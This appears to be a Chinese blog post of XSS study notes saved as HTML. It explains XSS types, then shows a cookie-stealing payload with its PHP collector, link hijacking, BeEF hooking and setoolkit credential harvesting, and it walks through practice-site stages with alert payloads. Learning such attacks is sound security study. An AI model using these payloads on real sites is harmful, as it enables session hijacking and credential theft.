@@ -1,0 +1,1251 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  
+  <title>xss学习笔记 | 0冻的盒子</title>
+  
+  
+
+  
+
+  <meta name="HandheldFriendly" content="True">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <!-- meta -->
+  
+
+  <!-- link -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.6.3/css/all.min.css">
+  
+
+  
+  <link rel="shortcut icon" type="image/x-icon" href="https://cdn.jsdelivr.net/lacc233/lacc233.github.io@v1.0/icon/redbox.png">
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-material-x@19.5/css/style.css">
+  
+
+  <script>
+    function setLoadingBarProgress(num) {
+      document.getElementById('loading-bar').style.width=num+"%";
+    }
+  </script>
+
+  
+  
+</head>
+
+<body>
+  
+  
+  <header class="l_header pure">
+  <div id="loading-bar-wrapper">
+    <div id="loading-bar" class="pure"></div>
+  </div>
+
+	<div class='wrapper'>
+		<div class="nav-main container container--flex">
+      <a class="logo flat-box" href='/' >
+        
+          0冻的盒子
+        
+      </a>
+			<div class='menu navgation'>
+				<ul class='h-list'>
+          
+  					
+  						<li>
+								<a class="nav flat-box" href="/"
+                  
+                  
+                  id="home">
+									<i class='fas fa-grin fa-fw'></i>&nbsp;示例
+								</a>
+							</li>
+      			
+  						<li>
+								<a class="nav flat-box" href="/categories/"
+                  
+                    rel="nofollow"
+                  
+                  
+                  id="categories">
+									<i class='fas fa-folder-open fa-fw'></i>&nbsp;分类
+								</a>
+							</li>
+      			
+  						<li>
+								<a class="nav flat-box" href="/tags/"
+                  
+                    rel="nofollow"
+                  
+                  
+                  id="tags">
+									<i class='fas fa-hashtag fa-fw'></i>&nbsp;标签
+								</a>
+							</li>
+      			
+  						<li>
+								<a class="nav flat-box" href="/archives/"
+                  
+                    rel="nofollow"
+                  
+                  
+                  id="archives">
+									<i class='fas fa-archive fa-fw'></i>&nbsp;归档
+								</a>
+							</li>
+      			
+      		
+				</ul>
+			</div>
+
+			
+				<div class="m_search">
+					<form name="searchform" class="form u-search-form">
+						<input type="text" class="input u-search-input" placeholder="搜索" />
+						<i class="icon fas fa-search fa-fw"></i>
+					</form>
+				</div>
+			
+			<ul class='switcher h-list'>
+				
+					<li class='s-search'><a class="fas fa-search fa-fw" href='javascript:void(0)'></a></li>
+				
+				<li class='s-menu'><a class="fas fa-bars fa-fw" href='javascript:void(0)'></a></li>
+			</ul>
+		</div>
+
+		<div class='nav-sub container container--flex'>
+			<a class="logo flat-box"></a>
+			<ul class='switcher h-list'>
+				<li class='s-comment'><a class="flat-btn fas fa-comments fa-fw" href='javascript:void(0)'></a></li>
+        
+          <li class='s-toc'><a class="flat-btn fas fa-list fa-fw" href='javascript:void(0)'></a></li>
+        
+			</ul>
+		</div>
+	</div>
+</header>
+	<aside class="menu-phone">
+    <header>
+		<nav class="menu navgation">
+      <ul>
+        
+          
+            <li>
+							<a class="nav flat-box" href="/"
+                
+                
+                id="home">
+								<i class='fas fa-clock fa-fw'></i>&nbsp;近期文章
+							</a>
+            </li>
+          
+            <li>
+							<a class="nav flat-box" href="/archives/"
+                
+                  rel="nofollow"
+                
+                
+                id="archives">
+								<i class='fas fa-archive fa-fw'></i>&nbsp;文章归档
+							</a>
+            </li>
+          
+            <li>
+							<a class="nav flat-box" href="/projects/"
+                
+                
+                id="projects">
+								<i class='fas fa-code-branch fa-fw'></i>&nbsp;开源项目
+							</a>
+            </li>
+          
+            <li>
+							<a class="nav flat-box" href="/friends/"
+                
+                  rel="nofollow"
+                
+                
+                id="friends">
+								<i class='fas fa-link fa-fw'></i>&nbsp;我的友链
+							</a>
+            </li>
+          
+            <li>
+							<a class="nav flat-box" href="https://xaoxuu.com/wiki/material-x/"
+                
+                  rel="nofollow"
+                
+                
+                id="https:xaoxuu.comwikimaterial-x">
+								<i class='fas fa-book fa-fw'></i>&nbsp;主题文档
+							</a>
+            </li>
+          
+            <li>
+							<a class="nav flat-box" href="/about/"
+                
+                  rel="nofollow"
+                
+                
+                id="about">
+								<i class='fas fa-info-circle fa-fw'></i>&nbsp;关于小站
+							</a>
+            </li>
+          
+       
+      </ul>
+		</nav>
+    </header>
+	</aside>
+<script>setLoadingBarProgress(40);</script>
+
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper'>
+      <div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+    
+    <div class="meta" id="header-meta">
+      
+        
+  
+    <h1 class="title">
+      <a href="/2019/08/04/xss学习笔记/">
+        xss学习笔记
+      </a>
+    </h1>
+  
+
+
+      
+      <div class='new-meta-box'>
+        
+          
+        
+          
+            
+  <div class='new-meta-item author'>
+    <a href="http://yoursite.com" rel="nofollow">
+      
+        <i class="fas fa-user" aria-hidden="true"></i>
+      
+      <p>0冻</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+    <p>2019-08-04</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+          
+        
+          
+            
+  
+    <div class="new-meta-item browse busuanzi">
+      <a class='notlink'>
+        <i class="fas fa-eye" aria-hidden="true"></i>
+        <p>
+          <span id="busuanzi_value_page_pv">
+            <i class="fas fa-spinner fa-spin fa-fw" aria-hidden="true"></i>
+          </span>
+        </p>
+      </a>
+    </div>
+  
+
+
+          
+        
+          
+            
+
+          
+        
+      </div>
+      
+        <hr>
+      
+    </div>
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          <p>xss学习记录</p>
+<a id="more"></a>
+
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>跨站脚本攻击（Cross Site Scripting）为了不和层叠样式表（CSS）混淆，故缩写为XSS；攻击者在web页面内插入恶意java script 代码，当用户浏览该页面时，恶意代码（js）会被执行，即达到攻击目的。</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>又称非持久性XSS，具有一次性。<br>攻击者通过邮件等形式将包含xss代码的链接发送给正常用户，当用户点击时，服务器接受该用户的请求并进行处理，然后把带有xss的代码发送给用户，用户浏览器解析执行代码，触发xss漏洞。</p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>又称持久型XSS，攻击脚本存储在目标服务器的数据库中，具有更强的隐蔽性。<br>攻击者在论坛上，博客，留言板中，发帖的过程中嵌入XSS攻击代码，帖子被目标服务器存储在数据库中。当用户进行正常访问时，触发XSS代码。</p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM型XSS全称Document Object Model，使用DOM动态访问更新文档的内容，结构及样式。<br>服务器响应不会处理攻击者脚本，而是用户浏览器处理这个响应时，DOM对象就会 处理XSS代码，触发XSS漏洞。</p>
+<h2 id="盗取cookie"><a href="#盗取cookie" class="headerlink" title="盗取cookie"></a>盗取cookie</h2><h3 id="cookie介绍"><a href="#cookie介绍" class="headerlink" title="cookie介绍"></a>cookie介绍</h3><p>某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）</p>
+<p>在http协议下，服务器或脚本可以维护客户工作站上信息的一种方式。cookie是由web服务器保存在用户浏览器（客户端）上的小文本文件，它可包含有关用户的信息</p>
+<p>目前cookie有临时的也有持续的，临时的只在浏览器上保存一段时间，超过规定时间，该cookie会被系统清除。</p>
+<p>服务器可以利用cookie包含信息的任意性来筛选或经常性维护这些信息，以判断在http传输中的状态。</p>
+<p>典型应用为判断注册用户是否已经登录网站；提示用户是否保存账号，保留用户信息，简化下次登录；购物车结账（在不同页面下选择的同一家的商品）信息都会写入到cookies。</p>
+<h3 id="反射xss盗取cookie"><a href="#反射xss盗取cookie" class="headerlink" title="反射xss盗取cookie"></a>反射xss盗取cookie</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?uname=&lt;script&gt;document.location='http://ip/xss_test/cookie.php?cookie='+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将连接发送到用户，用户点击即触发XSS漏洞，同时可以使用URL编码迷惑用户。</p>
+<p><code>cookie.php</code>代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie=$_GET[<span class="string">'cookie'</span>];</span><br><span class="line">file_put_contents(<span class="string">'cookie.txt'</span>,$cookie);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>cookie 接受cookie参数，写入到cookie.txt</p>
+</blockquote>
+<h3 id="利用cookie会话劫持"><a href="#利用cookie会话劫持" class="headerlink" title="利用cookie会话劫持"></a>利用cookie会话劫持</h3><p>burp登录界面修改cookie，成功登录</p>
+<h3 id="劫持会话后的操作"><a href="#劫持会话后的操作" class="headerlink" title="劫持会话后的操作"></a>劫持会话后的操作</h3><p> 1.修改配置文件<br> 2.上传webshell</p>
+<h2 id="篡改网页链接"><a href="#篡改网页链接" class="headerlink" title="篡改网页链接"></a>篡改网页链接</h2><h3 id="js代码讲解"><a href="#js代码讲解" class="headerlink" title="js代码讲解"></a>js代码讲解</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> link=<span class="built_in">document</span>.getElementsByTagName(<span class="string">"a"</span>);</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;link.length;j++)&#123;</span><br><span class="line">    link[j].href=<span class="string">"http://attacker-site.com/"</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>window.onload 当窗口加载时，执行匿名函数。<br>使用for循环遍历所有获得的连接a标签</p>
+</blockquote>
+<h3 id="xss篡改链接"><a href="#xss篡改链接" class="headerlink" title="xss篡改链接"></a>xss篡改链接</h3><p>在xss位置输入上面代码</p>
+<h3 id="篡改链接指向流量url"><a href="#篡改链接指向流量url" class="headerlink" title="篡改链接指向流量url"></a>篡改链接指向流量url</h3><p>刷流量，上述代码修改url</p>
+<h3 id="篡改链接指向恶意url"><a href="#篡改链接指向恶意url" class="headerlink" title="篡改链接指向恶意url"></a>篡改链接指向恶意url</h3><p>beef 进行恶意链接生成，以及利用hook.js执行其他命令。<br>kali中终端输入<code>beef-xss</code>启动beef并生成恶意链接,</p>
+<p>开启一个服务器( <code>service apache2 start</code>  )，将下面代码写入到代码（/var/www/index.html）当中</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"http://ip[:port]/hook.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后修改url至攻击者的服务器页面，点击即触发。</p>
+<h2 id="盗取用户信息"><a href="#盗取用户信息" class="headerlink" title="盗取用户信息"></a>盗取用户信息</h2><h3 id="盗取用户信息原理"><a href="#盗取用户信息原理" class="headerlink" title="盗取用户信息原理"></a>盗取用户信息原理</h3><p>克隆网站登录界面，利用存储xss设置跳转代码，如果用户访问即跳转到克隆的登录页面，用户输入登录，账号密码被存储。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">A[用户] --&gt; |访问| B[原始站点有存xss漏洞]</span><br><span class="line">B --&gt; |跳转| C[克隆站点]</span><br><span class="line">A --&gt; |输入账号密码|C</span><br><span class="line">C--&gt;|用户输入账号密码|D(成功获取并存储)</span><br></pre></td></tr></table></figure>
+
+<h3 id="setoolkit工具克隆网站"><a href="#setoolkit工具克隆网站" class="headerlink" title="setoolkit工具克隆网站"></a>setoolkit工具克隆网站</h3><p>万能的社工工具<br>Select from the menu: <code>从菜单中选择:</code></p>
+<p>   1) Social-Engineering Attacks <code>社会工程学攻击</code><br>   2) Penetration Testing (Fast-Track) <code>穿透测试(快速通道)</code><br>   3) Third Party Modules <code>第三方模块</code><br>   4) Update the Social-Engineer Toolkit <code>更新社交工程师工具包</code><br>   5) Update SET configuration <code>更新集合配置</code><br>   6) Help, Credits, and About <code>帮助，学分，等等</code></p>
+<blockquote>
+<p> 选中1<br>    1) Spear-Phishing Attack Vectors <code>鱼叉式钓鱼攻击载体</code><br>    2) Website Attack Vectors <code>网站攻击载体</code><br>    3) Infectious Media Generator <code>感染介质发生器</code><br>    4) Create a Payload and Listener <code>创建一个有效负载和侦听器</code><br>    5) Mass Mailer Attack <code>大规模邮件攻击</code><br>    6) Arduino-Based Attack Vector <code>基于arduino的攻击向量</code><br>    7) Wireless Access Point Attack Vector <code>无线接入点攻击向量</code><br>    8) QRCode Generator Attack Vector <code>QRCode生成器攻击向量</code><br>    9) Powershell Attack Vectors <code>Powershell攻击向量</code><br>    10) Third Party Modules <code>第三方模块</code><br> 选中2<br>    1) Java Applet Attack Method <code>Java Applet攻击方法</code><br>    2) Metasploit Browser Exploit Method <code>Metasploit浏览器利用方法</code><br>    3) Credential Harvester Attack Method <code>凭证收割机攻击方法</code><br>    4) Tabnabbing Attack Method <code>制表攻击法</code><br>    5) Web Jacking Attack Method <code>顶网攻击方法</code><br>    6) Multi-Attack Web Method <code>多攻击Web方法</code><br>    7) HTA Attack Method <code>HTA攻击方法</code><br> 选中3<br>    1) Web Templates <code>网页模板</code><br>    2) Site Cloner <code>现场切割</code><br>    3) Custom Import <code>自定义导入</code><br> 选中2</p>
+</blockquote>
+<p>Enter the IP address for POST back in Harvester/Tabnabbing: (默认会使用网卡上的地址)<br>Enter the url to clone:<code>输入要克隆的站点url</code></p>
+<h3 id="存储xss跳转克隆网站"><a href="#存储xss跳转克隆网站" class="headerlink" title="存储xss跳转克隆网站"></a>存储xss跳转克隆网站</h3><p>xss payload: </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.location=<span class="string">"http://ip/"</span>&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看盗取账号和密码"><a href="#查看盗取账号和密码" class="headerlink" title="查看盗取账号和密码"></a>查看盗取账号和密码</h3><p>在setoolkit终端中查看账号密码</p>
+<h2 id="没有过滤的xss"><a href="#没有过滤的xss" class="headerlink" title="没有过滤的xss"></a>没有过滤的xss</h2><h3 id="实验环境介绍"><a href="#实验环境介绍" class="headerlink" title="实验环境介绍"></a>实验环境介绍</h3><p>一个日本安全研究员制作的xss练习靶场<br><a href="https://xss-quiz.int21h.jp/" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/</a><br>在IE浏览器中打开</p>
+<h3 id="闭合文本标签利用xss"><a href="#闭合文本标签利用xss" class="headerlink" title="闭合文本标签利用xss"></a>闭合文本标签利用xss</h3><p>打开审查工具，查看代码</p>
+<blockquote>
+<p>stage #1 </p>
+<p><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/</a></p>
+</blockquote>
+<p>简单payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>闭合payload:  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&lt;/b&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="属性中的xss"><a href="#属性中的xss" class="headerlink" title="属性中的xss"></a>属性中的xss</h2><h3 id="配置chrome关闭xss-auditor"><a href="#配置chrome关闭xss-auditor" class="headerlink" title="配置chrome关闭xss-auditor"></a>配置chrome关闭xss-auditor</h3><p>右键Chrome快捷方式，选择属性，复制文件位置，创建快捷方式，粘贴，并在后面加上<code>--args --disable-xss-auditor</code> ,最后给快捷方式命名，完成。</p>
+<p>之后就不用IE了，改用Chrome。 </p>
+<h3 id="属性中xss发现"><a href="#属性中xss发现" class="headerlink" title="属性中xss发现"></a>属性中xss发现</h3><p>Ctrl+f<br>代码审查</p>
+<blockquote>
+<p>stage #2 </p>
+<p> <a href="http://xss-quiz.int21h.jp/stage2.php?sid=106cdb0a46450efb744850a579323ac9103d907c" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage2.php?sid=106cdb0a46450efb744850a579323ac9103d907c</a></p>
+</blockquote>
+<p>属性中xss闭合引入script</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>属性中xss闭合引入事件</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" onmouseover=alert(document.domain);&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="选择列表中的xss"><a href="#选择列表中的xss" class="headerlink" title="选择列表中的xss"></a>选择列表中的xss</h2><h3 id="html-select-标签介绍"><a href="#html-select-标签介绍" class="headerlink" title="html select 标签介绍"></a>html select 标签介绍</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select&gt;</span><br><span class="line">&lt;option&gt;name&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>select&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="表单介绍"><a href="#表单介绍" class="headerlink" title="表单介绍"></a>表单介绍</h3><p>html表单用于搜集不同类型的用户输入</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"?sid=..."</span> method=<span class="string">"post"</span>&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>burp测试</p>
+<blockquote>
+<p>stage #3 </p>
+<p><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=d830eb35fde6abc802cb930e5ba1b2adaaf6680d" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage-3.php?sid=d830eb35fde6abc802cb930e5ba1b2adaaf6680d</a></p>
+</blockquote>
+<p>抓取，p2储存在漏洞<br>payload: </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p2=japan&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="选择参数中的xss"><a href="#选择参数中的xss" class="headerlink" title="选择参数中的xss"></a>选择参数中的xss</h2><h3 id="html表单隐藏参数介绍"><a href="#html表单隐藏参数介绍" class="headerlink" title="html表单隐藏参数介绍"></a>html表单隐藏参数介绍</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"..."</span> value=<span class="string">"..."</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="html中svg介绍"><a href="#html中svg介绍" class="headerlink" title="html中svg介绍"></a>html中svg介绍</h3><p>svg：<br>意为可缩放的矢量图形，使用xml格式定义图像<br>可通过以下标签嵌入html文档：<code>&lt;wmbed&gt;</code>,<code>&lt;object&gt;</code>或者<code>&lt;iframe&gt;</code>，也可以使用<code>&lt;svg&gt;</code>标签嵌入</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/事件=<span class="string">""</span>&gt;</span><br><span class="line">&lt;svg/onload=alert(<span class="built_in">document</span>.domain)&gt;%<span class="number">0</span>a</span><br></pre></td></tr></table></figure>
+
+<h3 id="闭合触发xss"><a href="#闭合触发xss" class="headerlink" title="闭合触发xss"></a>闭合触发xss</h3><blockquote>
+<p>stage #4 </p>
+<p><a href="http://xss-quiz.int21h.jp/stage_4.php?sid=9fb2ab3ae196c1fb05d9157d3d5f6c91b2b4398c" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_4.php?sid=9fb2ab3ae196c1fb05d9157d3d5f6c91b2b4398c</a></p>
+</blockquote>
+<p>payload: </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="限制输入长度的xss"><a href="#限制输入长度的xss" class="headerlink" title="限制输入长度的xss"></a>限制输入长度的xss</h2><h3 id="html-表单文本框介绍"><a href="#html-表单文本框介绍" class="headerlink" title="html 表单文本框介绍"></a>html 表单文本框介绍</h3><p>html表单用于搜集不同类型的用户输入；表单元素指的是不同类型的input元素、复选框、单选按钮、提交按钮等等；这里介绍text定义常规文本输入。</p>
+<p>属性介绍：</p>
+<p>value 规定输入字段的初始值</p>
+<p>readonly 规定输入字段为只读</p>
+<p>disabled 规定输入字段是禁用的。被禁用的元素不可用，不可点击，不会提交。</p>
+<p>size 规定输入字段的字符</p>
+<p>maxlength 规定输入字段允许的最大长度</p>
+<h3 id="xss-payload长度计算"><a href="#xss-payload长度计算" class="headerlink" title="xss payload长度计算"></a>xss payload长度计算</h3><p>利用python len函数,如下，结果为40字符</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = <span class="string">"&lt;script&gt;alert(document.domain);&lt;/script&gt;"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(payload)</span><br></pre></td></tr></table></figure>
+
+<h3 id="浏览器审查工具修改源码"><a href="#浏览器审查工具修改源码" class="headerlink" title="浏览器审查工具修改源码"></a>浏览器审查工具修改源码</h3><blockquote>
+<p>stage #5 </p>
+<p><a href="http://xss-quiz.int21h.jp/stage--5.php?sid=2d4972900f3da3e4e8dd3bb442c5e59402ede268" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage--5.php?sid=2d4972900f3da3e4e8dd3bb442c5e59402ede268</a></p>
+</blockquote>
+<p>paylaod: 先修改maxlength</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="payload-触发xss漏洞"><a href="#payload-触发xss漏洞" class="headerlink" title="payload 触发xss漏洞"></a>payload 触发xss漏洞</h3><p>随着安全意识的提高，script可能会被过滤</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;svg/onload=alert(document.domaim)&gt;%0a</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">111</span><span class="string">" onmouseover="</span>alert(<span class="built_in">document</span>.domain)<span class="string">"</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="html事件中的xss"><a href="#html事件中的xss" class="headerlink" title="html事件中的xss"></a>html事件中的xss</h2><h3 id="html事件介绍"><a href="#html事件介绍" class="headerlink" title="html事件介绍"></a>html事件介绍</h3><p>在现代浏览器中内置有大量的事件处理器，监事特定的条件或用户行为，例如鼠标点击（onclick）或浏览器窗口完成加载某个图像（onload）。通过使用客户端的js,可以将某些特定的事件处理器作为属性添加给特定的标签，并可以在事件发生时执行一个或多个javascript命令或函数</p>
+<h3 id="xss漏洞发现"><a href="#xss漏洞发现" class="headerlink" title="xss漏洞发现"></a>xss漏洞发现</h3><blockquote>
+<p>stage #6 </p>
+<p><a href="http://xss-quiz.int21h.jp/stage-no6.php?sid=60b74c922558e644330a8769788ef25dae80d8e0" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage-no6.php?sid=60b74c922558e644330a8769788ef25dae80d8e0</a></p>
+</blockquote>
+<p> 审查代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>+"<span class="attr">132456</span>"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="闭合思路分析"><a href="#闭合思路分析" class="headerlink" title="闭合思路分析"></a>闭合思路分析</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"onmouseover="</span>alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;svg/onload=alert(document.domain)&gt;%0a</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="payload触发xss漏洞"><a href="#payload触发xss漏洞" class="headerlink" title="payload触发xss漏洞"></a>payload触发xss漏洞</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" onclick="</span>alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure>
+
+<h2 id="空格分隔属性的xss"><a href="#空格分隔属性的xss" class="headerlink" title="空格分隔属性的xss"></a>空格分隔属性的xss</h2><h3 id="xss探测"><a href="#xss探测" class="headerlink" title="xss探测"></a>xss探测</h3><blockquote>
+<p>stage #7 </p>
+<p><a href="http://xss-quiz.int21h.jp/stage07.php?sid=c702ac5f967df2831c3920c1aa3100af0b3e5aa8" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage07.php?sid=c702ac5f967df2831c3920c1aa3100af0b3e5aa8</a></p>
+</blockquote>
+<h3 id="触发xss"><a href="#触发xss" class="headerlink" title="触发xss"></a>触发xss</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span> onmouseover=alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure>
+
+<h2 id="javascript伪协议的xss"><a href="#javascript伪协议的xss" class="headerlink" title="javascript伪协议的xss"></a>javascript伪协议的xss</h2><h3 id="javascript伪协议介绍"><a href="#javascript伪协议介绍" class="headerlink" title="javascript伪协议介绍"></a>javascript伪协议介绍</h3><p>将js 代码添加到客户端，方法是把它放置在伪协议说明符<code>javascript:</code>后的url中。</p>
+<p>他声明了url的主题是任意javascript，它由javascript的解释器运行，若果javascript:url中的js代码含有多个语句，必须要用<code>;</code>讲这些语句分隔开</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:<span class="keyword">var</span> now = now Data();<span class="string">"&lt;h1&gt;this item&lt;/h1&gt;"</span> + now;</span><br></pre></td></tr></table></figure>
+
+<p>js 还可以只含有动作，但不返回值得js语句</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(<span class="string">"hello world"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>xss漏洞发现并触发</p>
+<p>设置第一无二字符串提交，在响应中寻找。</p>
+<blockquote>
+<p>stage #8 </p>
+<p><a href="http://xss-quiz.int21h.jp/stage008.php?sid=b23793aaeaad16b5faa949a246a1316e9cf24917" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage008.php?sid=b23793aaeaad16b5faa949a246a1316e9cf24917</a></p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure>
+
